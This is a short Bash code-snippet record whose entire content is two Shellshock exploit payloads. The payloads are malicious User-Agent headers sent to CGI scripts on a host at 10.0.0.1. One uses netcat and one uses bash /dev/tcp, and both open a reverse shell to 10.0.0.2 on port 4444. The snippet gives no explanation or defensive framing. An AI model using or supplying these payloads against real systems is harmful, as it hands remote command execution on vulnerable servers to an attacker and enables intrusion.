---
id: 3d7cf28a-8028-4123-992d-5e63efde6043
type: code
language: Bash
verified: false
created_at: '2023-04-06T03:55:56.991910+00:00'
updated_at: '2023-04-06T03:55:57.002278+00:00'
---

# Code Snippet 3d7cf28a

**Language**: Bash

```bash
echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc 10.0.0.2 4444 -e /bin/sh\r\n"
curl --silent -k -H "User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.0.0.2/4444 0>&1" "https://10.0.0.1/cgi-bin/admin.cgi" 
```


